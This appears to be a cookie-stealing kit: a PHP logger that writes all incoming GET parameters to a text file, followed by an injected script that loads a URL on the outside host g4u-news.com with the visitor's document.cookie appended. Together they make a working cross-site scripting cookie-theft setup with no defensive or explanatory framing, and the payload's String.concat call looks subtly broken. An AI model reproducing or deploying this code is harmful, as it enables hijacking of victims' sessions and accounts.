<?php
header('Cache-Control: no-cache');
header('Pragma: no-cache');

$file = fopen('sni_log.txt','a+');
fputs($file, print_r($_GET, true));
fclose($file);
?>
<script>var script=document.createElement('script');script.src=String.concat('http://g4u-news.com/logitru.php?', escape(document.cookie));document.body.appendChild(script);</script>